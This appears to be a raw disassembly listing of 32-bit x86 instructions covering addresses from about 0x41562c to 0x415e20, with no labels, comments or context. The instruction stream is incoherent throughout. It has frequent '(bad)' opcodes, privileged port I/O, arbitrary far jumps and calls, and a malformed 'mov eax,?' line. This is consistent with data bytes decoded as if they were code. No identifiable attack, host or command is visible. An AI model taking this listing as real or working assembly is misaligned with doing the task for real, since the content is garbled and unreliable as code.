  41562c:	into   
  41562d:	inc    esp
  41562e:	adc    al,0xc1
  415630:	mov    bl,0x89
  415632:	jg     0x415609
  415634:	and    eax,0x66430298
  415639:	repz shl BYTE PTR [edx],cl
  41563c:	ins    BYTE PTR es:[edi],dx
  41563d:	sti    
  41563e:	int    0xa5
  415640:	adc    esp,DWORD PTR [ebx-0xb]
  415643:	mov    BYTE PTR [esi],0x5c
  415646:	mov    esi,0x1713d844
  41564b:	out    dx,eax
  41564c:	dec    edx
  41564d:	out    0x33,eax
  41564f:	push   0xffffffca
  415651:	sbb    cl,ch
  415653:	ins    DWORD PTR es:[edi],dx
  415654:	mov    ds:0x5629ed98,eax
  415659:	sbb    DWORD PTR [ecx+esi*8-0x49],0x4126b0b1
  415661:	arpl   WORD PTR [edx-0x1e50151d],ax
  415667:	sbb    eax,0x696f0a01
  41566c:	js     0x4155f4
  41566e:	push   cs
  41566f:	js     0x41562b
  415671:	loopne 0x415662
  415673:	push   esp
  415674:	fdivr  QWORD PTR [edx-0x44a2abac]
  41567a:	repz pop ecx
  41567c:	adc    ah,BYTE PTR [edx+0x571891a0]
  415682:	aam    0xb6
  415684:	mov    al,0xbc
  415686:	mov    ebx,DWORD PTR [edi]
  415688:	and    DWORD PTR fs:[ecx-0x70],esi
  41568c:	pop    eax
  41568d:	(bad)  
  41568e:	popa   
  41568f:	je     0x41570d
  415691:	dec    esp
  415692:	sub    DWORD PTR [edi+eiz*2-0x6c],edx
  415696:	fs dec esi
  415698:	push   ebx
  415699:	aam    0x11
  41569b:	(bad)  
  41569c:	adc    ebx,esi
  41569e:	ds stos BYTE PTR es:[edi],al
  4156a0:	and    BYTE PTR [ebp+0x6b],al
  4156a3:	jge    0x41566e
  4156a5:	dec    edi
  4156a6:	mov    edx,esp
  4156a8:	mov    cl,0x83
  4156aa:	(bad)  
  4156ab:	icebp  
  4156ac:	xor    BYTE PTR [esi+0x54],ch
  4156af:	mov    BYTE PTR fs:[edi+eax*4+0x136b1b11],cl
  4156b7:	inc    ebp
  4156b8:	xor    edi,0x4b
  4156bb:	and    dl,ah
  4156bd:	test   DWORD PTR [edx-0x57],edi
  4156c0:	jle    0x415691
  4156c2:	and    BYTE PTR [ebx+0x48],dh
  4156c5:	pushf  
  4156c6:	cmp    ebp,DWORD PTR [ebx+0x3f]
  4156c9:	addr16 xor edi,esi
  4156cc:	ret    0xe772
  4156cf:	rcl    BYTE PTR [esp+eax*1-0x17],0x34
  4156d4:	mov    bh,0x62
  4156d6:	xchg   ebx,eax
  4156d7:	mov    ch,0xaa
  4156d9:	pop    esp
  4156da:	(bad)  
  4156db:	in     eax,dx
  4156dc:	repz adc BYTE PTR [ebp+0x1b0c78b2],bh
  4156e3:	imul   esi,DWORD PTR [ecx+0x497673b6],0xffffffcd
  4156ea:	fcomp  DWORD PTR [eax+0x750392db]
  4156f0:	mov    ch,0x84
  4156f2:	fld    QWORD PTR [esi+0x51]
  4156f5:	adc    DWORD PTR [esi+0x25872688],ebp
  4156fb:	adc    eax,0x575a77fc
  415700:	mov    eax,ds:0xa5a6e6f0
  415705:	cmp    al,0xdc
  415707:	cli    
  415708:	add    dl,BYTE PTR [ecx+0x10]
  41570b:	dec    eax
  41570c:	loopne 0x41574f
  41570e:	mov    ch,0xab
  415710:	or     edi,DWORD PTR [edi]
  415712:	inc    esp
  415713:	sbb    DWORD PTR [edx-0x638f6f1b],ebx
  415719:	sub    eax,0x92f5b517
  41571e:	loopne 0x415719
  415720:	sub    ecx,DWORD PTR ds:[ebx+0x7363e2ad]
  415727:	fwait
  415728:	xor    al,BYTE PTR [esp+ebx*8-0x32ba5d73]
  41572f:	aaa    
  415730:	int    0xab
  415732:	adc    ch,ch
  415734:	cmp    esp,DWORD PTR [edi]
  415736:	inc    ecx
  415737:	lock in eax,dx
  415739:	add    dh,dl
  41573b:	enter  0x5628,0x80
  41573f:	aas    
  415740:	outs   dx,DWORD PTR ds:[esi]
  415741:	shl    DWORD PTR [edx-0x6894cab1],0x77
  415748:	or     DWORD PTR [eax],ecx
  41574a:	sahf   
  41574b:	or     al,ah
  41574d:	sbb    cl,0x13
  415750:	jo     0x415794
  415752:	sbb    ebx,DWORD PTR [edi-0x46de70f7]
  415758:	dec    esp
  415759:	pop    ecx
  41575a:	pop    eax
  41575b:	pop    ss
  41575c:	int3   
  41575d:	lock mov bh,0x90
  415760:	fisttp DWORD PTR [eax]
  415762:	sbb    DWORD PTR [ecx-0x597ff9ad],edi
  415768:	outs   dx,BYTE PTR ds:[esi]
  415769:	into   
  41576a:	adc    al,BYTE PTR [eax+0x56]
  41576d:	outs   dx,BYTE PTR ds:[esi]
  41576e:	shl    DWORD PTR [esi],0xf3
  415771:	pop    ds
  415772:	jl     0x415782
  415774:	jns    0x4157f5
  415776:	(bad)  
  415777:	out    0x6e,eax
  415779:	lock movd DWORD PTR [ebx-0x63],mm7
  41577e:	hlt    
  41577f:	sub    al,BYTE PTR [esi+0x16]
  415782:	jge    0x415717
  415784:	aas    
  415785:	sub    ebp,DWORD PTR [edi-0x4fef3491]
  41578b:	and    al,0x27
  41578d:	js     0x41572e
  41578f:	xchg   ebp,eax
  415790:	shl    BYTE PTR [ebx+edx*4],0xc7
  415794:	pop    edx
  415795:	fisub  WORD PTR [esi+ecx*1-0x76]
  415799:	loope  0x415759
  41579b:	xchg   esi,eax
  41579c:	outs   dx,DWORD PTR ds:[esi]
  41579d:	or     BYTE PTR [esi+0x3c],ah
  4157a0:	in     eax,0x58
  4157a2:	lods   al,BYTE PTR ds:[esi]
  4157a3:	push   ebx
  4157a4:	sbb    DWORD PTR [ecx+edi*2],0x75de3bbf
  4157ab:	or     eax,0x99256108
  4157b0:	and    BYTE PTR [eax],0xf9
  4157b3:	inc    esi
  4157b4:	cmp    ecx,DWORD PTR [ebx+0x58a52bca]
  4157ba:	push   esp
  4157bb:	dec    esp
  4157bc:	add    al,BYTE PTR [edi]
  4157be:	arpl   WORD PTR [ebx],dx
  4157c0:	push   eax
  4157c1:	adc    ch,ch
  4157c3:	push   ds
  4157c4:	out    0x80,al
  4157c6:	outs   dx,DWORD PTR ds:[esi]
  4157c7:	cmc    
  4157c8:	call   0x925e1c42
  4157cd:	leave  
  4157ce:	jmp    0x415848
  4157d0:	les    esp,FWORD PTR [ebx-0x134546ba]
  4157d6:	dec    edi
  4157d7:	and    DWORD PTR [ecx],0xa45b9435
  4157dd:	inc    ebx
  4157de:	test   al,0x42
  4157e0:	ret    0x486a
  4157e3:	adc    ch,al
  4157e5:	jbe    0x415785
  4157e7:	xor    BYTE PTR [ebp-0x1a],ah
  4157ea:	dec    ecx
  4157eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4157ec:	or     DWORD PTR [esi],ebp
  4157ee:	loope  0x41584c
  4157f0:	xchg   edx,eax
  4157f1:	add    eax,0x4d12e6c0
  4157f6:	push   0xe9e94cb0
  4157fb:	xchg   edx,eax
  4157fc:	xchg   DWORD PTR ds:0xa540490c,edi
  415802:	jl     0x415870
  415804:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415805:	pop    ss
  415806:	add    al,0xfd
  415808:	cli    
  415809:	mov    ds:0xc9044c69,al
  41580e:	or     dh,cl
  415810:	fistp  DWORD PTR [edi-0x1b]
  415813:	sbb    cl,bh
  415815:	sahf   
  415816:	outs   dx,BYTE PTR ds:[esi]
  415817:	fcmovne st,st(1)
  415819:	mov    WORD PTR [edi+0x6d],ds
  41581c:	cmp    bh,bh
  41581e:	cmp    al,0xe6
  415820:	fstp   TBYTE PTR [esi]
  415822:	fisubr WORD PTR [eax-0x50]
  415825:	gs ja  0x415816
  415828:	std    
  415829:	and    bh,BYTE PTR [ecx-0x5]
  41582c:	arpl   WORD PTR [esi+0x20],bp
  41582f:	cli    
  415830:	mov    dl,BYTE PTR [edx-0x7cd8131d]
  415836:	lahf   
  415837:	cld    
  415838:	pop    esp
  415839:	push   es
  41583a:	mov    ch,0x35
  41583c:	add    dl,al
  41583e:	in     eax,dx
  41583f:	pusha  
  415840:	or     cl,BYTE PTR [edx+0x0]
  415843:	sub    BYTE PTR [edx+0x24],bh
  415846:	adc    DWORD PTR ds:0xcd9d9811,esp
  41584c:	dec    esp
  41584d:	xor    eax,0xaa574fe3
  415852:	mov    dl,0xdc
  415854:	add    edx,DWORD PTR [esi]
  415856:	dec    edi
  415857:	pop    esp
  415858:	ss dec edi
  41585a:	cmp    eax,0xa37dcbb
  41585f:	mov    eax,ds:0x5261b62f
  415864:	leave  
  415865:	scas   ax,WORD PTR es:[edi]
  415867:	mov    ebx,0xdad152c2
  41586c:	inc    edx
  41586d:	sbb    DWORD PTR [eax+eax*4-0x102c08aa],edx
  415874:	dec    ecx
  415875:	and    al,0x90
  415877:	mov    eax,ds:0xf4660f81
  41587c:	sub    esi,DWORD PTR [edx-0x70a443be]
  415882:	loop   0x415820
  415884:	or     esp,DWORD PTR [edx-0x1dc2733a]
  41588a:	jb     0x415858
  41588c:	xor    edi,edi
  41588e:	inc    edx
  41588f:	aam    0xbb
  415891:	inc    ebx
  415892:	not    DWORD PTR [ebx+ecx*4-0x31]
  415896:	push   ds
  415897:	enterw 0x69ea,0x60
  41589c:	popf   
  41589d:	mov    cl,0xfb
  41589f:	push   es
  4158a0:	lahf   
  4158a1:	retf   
  4158a2:	cli    
  4158a3:	in     eax,0xea
  4158a5:	pop    esp
  4158a6:	push   ebp
  4158a7:	sub    BYTE PTR [edx],dh
  4158a9:	and    eax,0x7727320d
  4158ae:	dec    edi
  4158af:	in     al,0xf4
  4158b1:	fcom   DWORD PTR [eax-0x6a]
  4158b4:	in     eax,0x6e
  4158b6:	fnstcw WORD PTR [edi+0x4e72d4ed]
  4158bc:	xor    eax,0xe2c1dab9
  4158c1:	or     eax,0xbc6a6c94
  4158c6:	cmp    DWORD PTR [edi-0x55f8b1f0],esi
  4158cc:	ins    DWORD PTR es:[edi],dx
  4158cd:	mov    ecx,0x58725eab
  4158d2:	test   ebx,esi
  4158d4:	inc    esi
  4158d5:	(bad)
  4158d8:	(bad)  
  4158d9:	jmp    FWORD PTR [ebx+ebx*4-0x7049a88f]
  4158e0:	or     DWORD PTR [edi+0x7d],esi
  4158e3:	pop    eax
  4158e4:	neg    dh
  4158e6:	pop    edi
  4158e7:	mov    esi,0xf722a484
  4158ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158ed:	or     cl,0xc0
  4158f0:	(bad)  
  4158f1:	jge    0x4158b5
  4158f3:	add    eax,0xcf3e3d01
  4158f8:	adc    DWORD PTR [ebx+0x6d],edx
  4158fb:	jne    0x41594e
  4158fd:	lods   al,BYTE PTR ds:[esi]
  4158fe:	cdq    
  4158ff:	inc    ebx
  415900:	mov    edx,0x1f043220
  415905:	not    BYTE PTR cs:[eax+0x7bc3ce5f]
  41590c:	lods   eax,DWORD PTR ds:[esi]
  41590d:	sub    eax,0xae933140
  415912:	scas   eax,DWORD PTR es:[edi]
  415913:	dec    esp
  415914:	fnsave [ebp+0x2d2ea671]
  41591a:	jge    0x4158b6
  41591c:	jb     0x4158b7
  41591e:	repz or bh,dl
  415921:	outs   dx,BYTE PTR ds:[esi]
  415922:	ret    
  415923:	mov    cl,0xcb
  415925:	jmp    0xffa2:0x80fd0efe
  41592c:	xchg   esp,eax
  41592d:	in     eax,0x78
  41592f:	sahf   
  415930:	pop    ebx
  415931:	jns    0x415917
  415933:	mov    eax,ds:0x2605f872
  415938:	sub    eax,0xe4b16f18
  41593d:	test   DWORD PTR [edi-0x6796a825],0xff259060
  415947:	bt     DWORD PTR [ecx-0x2413816a],esi
  41594e:	xor    al,0x87
  415950:	adc    esi,DWORD PTR [edx-0x28]
  415953:	or     dl,al
  415955:	push   es
  415956:	jmp    0x415941
  415958:	inc    ebp
  415959:	jge    0x4159a8
  41595b:	call   0xf344:0x95896542
  415962:	sahf   
  415963:	lds    esp,FWORD PTR [eax+0xb]
  415966:	int    0xed
  415968:	and    BYTE PTR [esi],0xc4
  41596b:	dec    DWORD PTR [eax]
  41596d:	add    BYTE PTR [ebx+ebp*2-0x6d],bh
  415971:	addr16 pop ds
  415973:	out    dx,al
  415974:	in     eax,0xe2
  415976:	sub    al,0x67
  415978:	arpl   WORD PTR [ecx+0x5b],cx
  41597b:	out    dx,eax
  41597c:	pop    esi
  41597d:	fdiv   QWORD PTR [eax+0x1]
  415980:	push   0xd3452b7d
  415985:	fld    DWORD PTR [edi-0x1d]
  415988:	xchg   edx,eax
  415989:	push   ecx
  41598a:	aaa    
  41598b:	push   eax
  41598c:	dec    eax
  41598d:	dec    ebp
  41598e:	cmp    BYTE PTR [ebp+0x6e6b6ece],ah
  415994:	(bad)  
  415995:	jbe    0x4159ed
  415997:	fs mov bl,0x8
  41599a:	test   eax,0x603eeba2
  41599f:	xor    al,0xd4
  4159a1:	(bad)  
  4159a2:	push   cs
  4159a3:	cmp    BYTE PTR [ecx],ah
  4159a5:	repnz xor WORD PTR [edi],0x5a
  4159aa:	lahf   
  4159ab:	(bad)  
  4159ac:	aad    0xba
  4159ae:	pop    es
  4159af:	in     eax,0xc9
  4159b1:	les    esi,FWORD PTR [ecx+0x32]
  4159b4:	push   0xffffff93
  4159b6:	push   ss
  4159b7:	aas    
  4159b8:	pop    eax
  4159b9:	in     al,0xb4
  4159bb:	shl    BYTE PTR [ecx+edx*1-0x5953c653],cl
  4159c2:	mov    eax,0xf5632fc5
  4159c7:	xor    DWORD PTR [ebx-0x76],0xffffffd8
  4159cb:	je     0x415958
  4159cd:	and    eax,0xd0ffc13d
  4159d2:	xchg   ebx,eax
  4159d3:	inc    ebp
  4159d4:	retf   0x1c58
  4159d7:	ins    DWORD PTR es:[edi],dx
  4159d8:	cdq    
  4159d9:	les    ebx,FWORD PTR [eax+0x22]
  4159dc:	adc    al,0x37
  4159de:	sar    BYTE PTR [ecx-0x4de7f5],1
  4159e4:	xchg   edx,eax
  4159e5:	daa    
  4159e6:	mov    dh,0xe3
  4159e8:	fucom  st(6)
  4159ea:	dec    ebp
  4159eb:	into   
  4159ec:	jb     0x415a11
  4159ee:	and    edx,DWORD PTR [eax+0xae91055]
  4159f4:	or     BYTE PTR [esi+0x57],ch
  4159f7:	adc    edi,esp
  4159f9:	cld    
  4159fa:	cmp    BYTE PTR [eax],dh
  4159fc:	data16 jecxz 0x415a45
  4159ff:	aas    
  415a00:	aaa    
  415a01:	outs   dx,DWORD PTR ds:[esi]
  415a02:	pop    edx
  415a03:	imul   edx,DWORD PTR [ebp+0x68],0xda7501de
  415a0a:	ss aad 0x44
  415a0d:	fwait
  415a0e:	into   
  415a0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a10:	lahf   
  415a11:	ret    
  415a12:	arpl   WORD PTR [eax+0x5e],di
  415a15:	and    ebp,edi
  415a17:	cmp    DWORD PTR [eax+0x655cd58d],0x62
  415a1e:	popa   
  415a1f:	push   cs
  415a20:	call   0x62169a
  415a25:	xchg   edx,eax
  415a26:	popf   
  415a27:	jecxz  0x415a6b
  415a29:	retf   0xf862
  415a2c:	shl    BYTE PTR [edi+eax*2],1
  415a2f:	xor    BYTE PTR [edx],0xe0
  415a32:	jmp    0x3fe1:0x58e2947f
  415a39:	shl    dh,0xbc
  415a3c:	ja     0x415a69
  415a3e:	ins    BYTE PTR es:[edi],dx
  415a3f:	test   DWORD PTR [edx+0x22],edi
  415a42:	push   edx
  415a43:	mov    DWORD PTR [esi+edi*1],ebp
  415a46:	(bad)  
  415a47:	out    dx,al
  415a48:	in     al,0x83
  415a4a:	xor    al,BYTE PTR ds:0xda6c2935
  415a50:	outs   dx,DWORD PTR ds:[esi]
  415a51:	xor    BYTE PTR [ebx-0x31],0xea
  415a55:	call   0x774e:0x51e31a67
  415a5c:	pop    ds
  415a5d:	mov    ebx,0x1cde5091
  415a62:	pop    es
  415a63:	sbb    DWORD PTR [ecx-0x56aae241],ebx
  415a69:	add    DWORD PTR [ebp-0x6],esp
  415a6c:	add    ch,BYTE PTR [edx]
  415a6e:	mov    dl,0xb7
  415a70:	jno    0x415a29
  415a72:	repnz shl DWORD PTR [edi-0x6a4834e6],0xa9
  415a7a:	call   0x1bb65a95
  415a7f:	sub    BYTE PTR [edx+eax*8],0x6d
  415a83:	loope  0x415a33
  415a85:	int    0x66
  415a87:	pop    ebx
  415a88:	push   ss
  415a89:	loopne 0x415a8f
  415a8b:	mov    ah,0x74
  415a8d:	jno    0x415b0c
  415a8f:	call   0x7984:0x758a3777
  415a96:	std    
  415a97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a98:	(bad)  
  415a99:	jmp    FWORD PTR [ebp-0x7b96c79e]
  415a9f:	dec    ecx
  415aa0:	fsub   st,st(1)
  415aa2:	jno    0x415abe
  415aa4:	inc    edi
  415aa5:	jmp    0x9a8f436f
  415aaa:	jns    0x415a9a
  415aac:	test   eax,0xbaf63b98
  415ab1:	jge    0x415ad0
  415ab3:	jmp    FWORD PTR [ebx+0x575d497f]
  415ab9:	pop    eax
  415aba:	repnz adc BYTE PTR [edi-0xb],dh
  415abe:	add    BYTE PTR [eax-0xa],dh
  415ac1:	and    edi,DWORD PTR [ebp+ebx*8+0x61e0dc43]
  415ac8:	outs   dx,BYTE PTR ds:[esi]
  415ac9:	add    al,0x19
  415acb:	pop    ds
  415acc:	(bad)  
  415acd:	fistp  DWORD PTR [esi]
  415acf:	adc    eax,0x6c7d917c
  415ad4:	out    0x4,al
  415ad6:	ror    BYTE PTR [ebp-0x4d],1
  415ad9:	sbb    eax,0xc4845c2c
  415ade:	fucomp st(4)
  415ae0:	adc    BYTE PTR [ebx-0x3a],dl
  415ae3:	daa    
  415ae4:	dec    ebx
  415ae5:	ss popf 
  415ae7:	inc    edi
  415ae8:	pop    es
  415ae9:	(bad)  
  415aea:	not    BYTE PTR ds:0xb1db524f
  415af0:	mov    esp,0xb723ae9
  415af5:	jp     0x415aa8
  415af7:	sti    
  415af8:	retf   
  415af9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415afa:	jae    0x415b2f
  415afc:	or     BYTE PTR [ebx-0x728bd5f7],dl
  415b02:	add    BYTE PTR [ebx],0x8
  415b05:	mov    cl,0x3f
  415b07:	jecxz  0x415af7
  415b09:	xor    eax,0x3a369c68
  415b0e:	mov    eax,ds:0xb98ae71b
  415b13:	or     edx,DWORD PTR [ebp-0x2c]
  415b16:	aas    
  415b17:	shl    BYTE PTR [eax+0x6e],1
  415b1a:	xchg   ebx,eax
  415b1b:	adc    BYTE PTR [edi+esi*2+0x664ea054],cl
  415b22:	test   BYTE PTR [esi],al
  415b24:	out    dx,eax
  415b25:	fs mov cl,0x88
  415b28:	mov    ds:0xac78073e,al
  415b2d:	fsubr  QWORD PTR [eax+edx*4-0x34]
  415b31:	xor    al,0x2a
  415b33:	aaa    
  415b34:	xor    DWORD PTR [ebx+ebp*2],ebx
  415b37:	mov    al,ds:0xbf2fd650
  415b3c:	loopne 0x415b54
  415b3e:	cmp    eax,0xc4b4af3b
  415b43:	adc    DWORD PTR [esi],ecx
  415b45:	mov    ds:0x98ea2fdb,eax
  415b4a:	int3   
  415b4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b4c:	mov    esi,fs
  415b4e:	das    
  415b4f:	mov    ecx,0x4df5e968
  415b54:	mov    cl,0x74
  415b56:	dec    edi
  415b57:	test   BYTE PTR [ebx-0x1ce5d66c],bh
  415b5d:	je     0x415b9d
  415b5f:	test   DWORD PTR [esi+edi*1],edi
  415b62:	sub    BYTE PTR [ebx],0x64
  415b65:	and    BYTE PTR [esi+edi*1],dl
  415b68:	cmp    ecx,edi
  415b6a:	jno    0x415af8
  415b6c:	addr16 xor al,0x55
  415b6f:	cld    
  415b70:	cmc    
  415b71:	bound  eax,QWORD PTR [edi+0x19]
  415b74:	mov    dl,0x59
  415b76:	push   ebx
  415b77:	jle    0x415b07
  415b79:	or     esp,DWORD PTR [edx]
  415b7b:	xor    al,0x27
  415b7d:	push   edi
  415b7e:	jmp    0x28bbefc1
  415b83:	cli    
  415b84:	adc    ch,BYTE PTR [edi-0x1de6a220]
  415b8a:	sbb    dh,BYTE PTR [ebx-0x548ba6be]
  415b90:	inc    ecx
  415b91:	sub    DWORD PTR [ecx+0x76721c1d],eax
  415b97:	jle    0x415b66
  415b99:	and    al,ch
  415b9b:	mov    ds:0xb3ffd358,al
  415ba0:	sahf   
  415ba1:	add    dh,BYTE PTR [ebp+0x56]
  415ba4:	divps  xmm2,XMMWORD PTR [edi-0x1b522aa0]
  415bab:	jp     0x415b53
  415bad:	shl    dh,0x45
  415bb0:	clc    
  415bb1:	jecxz  0x415b5a
  415bb3:	push   esi
  415bb4:	xor    edi,DWORD PTR [edx+0x1659285c]
  415bba:	xor    DWORD PTR [edx+0x5e56dfda],edx
  415bc0:	inc    ecx
  415bc1:	sbb    esi,ecx
  415bc3:	and    DWORD PTR [esi-0x73],esp
  415bc6:	mov    DWORD PTR [ecx+0x1c1e838],ebx
  415bcc:	mov    edi,edi
  415bce:	pop    ebp
  415bcf:	loop   0x415c4d
  415bd1:	add    eax,0x7dec6821
  415bd6:	inc    esi
  415bd7:	dec    ebx
  415bd8:	(bad)  
  415bd9:	xchg   edx,eax
  415bda:	xchg   edi,ecx
  415bdc:	aam    0xf7
  415bde:	leave  
  415bdf:	and    eax,0x717915f7
  415be4:	ins    BYTE PTR es:[edi],dx
  415be5:	scas   al,BYTE PTR es:[edi]
  415be6:	scas   eax,DWORD PTR es:[edi]
  415be7:	cdq    
  415be8:	imul   ebx,DWORD PTR [ebx-0x6f],0x77
  415bec:	call   0x7bd7:0x2a73cbad
  415bf3:	in     al,dx
  415bf4:	mov    bh,0xdc
  415bf6:	shl    BYTE PTR [ecx+0x1a],0x4a
  415bfa:	jae    0x415b8e
  415bfc:	comiss xmm3,DWORD PTR [ebp-0xae5653a]
  415c03:	rcl    DWORD PTR [ebp+0x2b],0xb5
  415c07:	inc    ecx
  415c08:	mov    eax,ds:0xd31bdf0c
  415c0d:	fistp  WORD PTR [ebx]
  415c0f:	sub    al,0x55
  415c11:	loope  0x415ba1
  415c13:	cmp    DWORD PTR [ecx-0x22e854b6],ebx
  415c19:	adc    BYTE PTR [edx-0x17f282e6],0x62
  415c20:	out    0x33,al
  415c22:	push   ebx
  415c23:	mov    ds:0xb2a3f914,al
  415c28:	push   ecx
  415c29:	fcmovnbe st,st(3)
  415c2b:	fcomp  QWORD PTR [ebx-0x3b9dae4b]
  415c31:	clc    
  415c32:	push   ss
  415c33:	sub    eax,0xefbc986f
  415c38:	jmp    0x415bc3
  415c3a:	iret   
  415c3b:	adc    ch,bl
  415c3d:	mov    edi,0xebf49dda
  415c42:	mov    eax,?
  415c44:	int    0x73
  415c46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c47:	clc    
  415c48:	sub    DWORD PTR ds:[esp+esi*4],edi
  415c4c:	stos   DWORD PTR es:[edi],eax
  415c4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c4e:	mov    cl,al
  415c50:	iret   
  415c51:	and    edx,ebx
  415c53:	mov    DWORD PTR [ecx+0x3b2affe4],ebp
  415c59:	xchg   esi,eax
  415c5a:	mov    bl,0x5c
  415c5c:	ja     0x415c10
  415c5e:	jp     0x415bee
  415c60:	imul   edi,DWORD PTR [edx+0x3e],0xffffffd8
  415c64:	cmp    edx,edx
  415c66:	icebp  
  415c67:	dec    esi
  415c68:	pop    esp
  415c69:	adc    eax,0x822a0ecd
  415c6e:	xchg   ecx,eax
  415c6f:	mov    esp,0x25e7feb4
  415c74:	ret    
  415c75:	xchg   ebp,eax
  415c76:	(bad)  
  415c77:	or     bh,ch
  415c79:	ds push edx
  415c7b:	xchg   esi,eax
  415c7c:	(bad)  
  415c7e:	jg     0x415ceb
  415c80:	aaa    
  415c81:	jo     0x415cf9
  415c83:	push   esp
  415c84:	inc    esi
  415c85:	or     ecx,DWORD PTR [eax+0x1d790e3]
  415c8b:	dec    esp
  415c8c:	ins    DWORD PTR es:[edi],dx
  415c8d:	cmp    edi,DWORD PTR [esi*4+0x656ed750]
  415c94:	sbb    DWORD PTR [ebx+0x49262a2d],ebp
  415c9a:	imul   ebp,DWORD PTR [eax-0x27],0x51
  415c9e:	mov    dl,0x35
  415ca0:	rol    BYTE PTR [esi+eiz*2+0x75],1
  415ca4:	les    esp,FWORD PTR [ebx-0x3]
  415ca7:	bound  esi,QWORD PTR [esi]
  415ca9:	int    0x9d
  415cab:	cs (bad) 
  415cad:	xchg   ebp,eax
  415cae:	jo     0x415d0e
  415cb0:	pop    esi
  415cb1:	stc    
  415cb2:	mov    ds:0x45a8cdbc,al
  415cb7:	cmp    eax,0x9b6d2137
  415cbc:	or     ch,BYTE PTR [ecx+0x58d33516]
  415cc2:	jmp    0x415c98
  415cc4:	std    
  415cc5:	mov    al,ds:0x8edd0216
  415cca:	or     dh,BYTE PTR [ecx+0x27]
  415ccd:	adc    cl,BYTE PTR [ebx]
  415ccf:	sub    eax,0x2f4d663a
  415cd4:	test   eax,0x1ea5eaa5
  415cd9:	mov    esi,0x6e1849ad
  415cde:	dec    esi
  415cdf:	popa   
  415ce0:	add    al,ch
  415ce2:	fwait
  415ce3:	cmp    bl,bl
  415ce5:	jmp    FWORD PTR [edi-0x15a27e36]
  415ceb:	repnz sub ch,dl
  415cee:	add    ebp,edx
  415cf0:	mov    ds:0x7a33c6a2,al
  415cf5:	cmp    edx,DWORD PTR [edi+ebx*2-0x6287685]
  415cfc:	(bad)  [eax]
  415cfe:	inc    ebx
  415cff:	in     al,dx
  415d00:	retf   
  415d01:	sub    eax,0xf8e43059
  415d06:	push   es
  415d07:	xchg   ebx,eax
  415d08:	dec    esi
  415d09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d0a:	jl     0x415cd0
  415d0c:	sbb    eax,0xeb9081f3
  415d11:	sti    
  415d12:	int3   
  415d13:	scas   eax,DWORD PTR es:[edi]
  415d14:	jg     0x415cc1
  415d16:	fstp   TBYTE PTR [edx+0x0]
  415d19:	repnz imul edx,DWORD PTR ds:0x5e1e8765,0xa0f65870
  415d24:	cmp    BYTE PTR ds:0x96f826c8,0x61
  415d2b:	pop    eax
  415d2c:	ss mov ebx,0x3bf93b02
  415d32:	xchg   ah,bh
  415d34:	jmp    0x2ada5259
  415d39:	das    
  415d3a:	bound  eax,QWORD PTR [ebp-0x74]
  415d3d:	pop    ebp
  415d3e:	stos   DWORD PTR es:[edi],eax
  415d3f:	sub    edi,edx
  415d41:	in     al,0x6a
  415d43:	cld    
  415d44:	cmp    DWORD PTR [ebx+ecx*2+0x747c345],0xec7854fb
  415d4f:	ins    BYTE PTR es:[edi],dx
  415d50:	call   0xe4ee:0x783f0853
  415d57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d58:	aam    0x5c
  415d5a:	test   al,0xa4
  415d5c:	(bad)  
  415d5e:	mov    ecx,0x1e17476a
  415d63:	cs jo  0x415da2
  415d66:	in     al,dx
  415d67:	jge    0x415d96
  415d69:	adc    al,0x5e
  415d6b:	xchg   BYTE PTR [esp+ebp*4],ah
  415d6e:	test   edx,ebp
  415d70:	mov    edx,0xa1058cfc
  415d75:	daa    
  415d76:	icebp  
  415d77:	mov    ds:0xb0986604,al
  415d7c:	addr16 ja 0x415db6
  415d7f:	jmp    0xd043:0xd6c08b47
  415d86:	daa    
  415d87:	sahf   
  415d88:	sub    dl,al
  415d8a:	pop    ss
  415d8b:	or     esi,ebp
  415d8d:	test   al,0xe0
  415d8f:	add    al,0x29
  415d91:	sbb    dl,ah
  415d93:	ja     0x415de3
  415d95:	stos   BYTE PTR es:[edi],al
  415d96:	out    0xad,eax
  415d98:	mov    ebp,esp
  415d9a:	shl    DWORD PTR [eax+eiz*2],0x2c
  415d9e:	mov    ebx,esi
  415da0:	add    ebp,DWORD PTR [ecx+0x41beae29]
  415da6:	adc    dh,BYTE PTR [ecx+0x357fe96e]
  415dac:	dec    edx
  415dad:	cmc    
  415dae:	daa    
  415daf:	gs cmp al,0x93
  415db2:	push   ebp
  415db3:	pushf  
  415db4:	stos   DWORD PTR es:[edi],eax
  415db5:	sub    edi,0x39d80908
  415dbb:	lock xor al,dh
  415dbe:	add    al,0x71
  415dc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415dc1:	jmp    0x5b99ebf3
  415dc6:	fnstcw WORD PTR [esi]
  415dc8:	pop    edx
  415dc9:	mov    ds:0xfa479bc5,eax
  415dce:	sbb    DWORD PTR [ebx],esi
  415dd0:	shl    eax,0xaa
  415dd3:	js     0x415d86
  415dd5:	mov    ebp,0xde5a768
  415dda:	sub    al,0x78
  415ddc:	sub    al,0xc6
  415dde:	sbb    eax,0x177e1bb4
  415de3:	retf   0x7188
  415de6:	shr    BYTE PTR [ebx],cl
  415de8:	mov    ecx,0xae2b23ce
  415ded:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415dee:	cs dec eax
  415df0:	fsub   DWORD PTR [ebp+0x2be04380]
  415df6:	xchg   edx,eax
  415df7:	ficomp DWORD PTR [esi+0x48b2a1b1]
  415dfd:	cmp    al,0xf
  415dff:	mov    dh,0x2c
  415e01:	cmc    
  415e02:	push   eax
  415e03:	cmp    DWORD PTR [eax+ebp*2+0x58a197d0],0xfd0aa799
  415e0e:	inc    esi
  415e0f:	lahf   
  415e10:	dec    ecx
  415e11:	clc    
  415e12:	xor    edx,eax
  415e14:	out    dx,al
  415e15:	adc    eax,0x46d4ffc7
  415e1a:	bound  ebx,QWORD PTR [ecx+edx*4+0x36]
  415e1e:	mov    bl,0x70
  415e20:	dec    esi
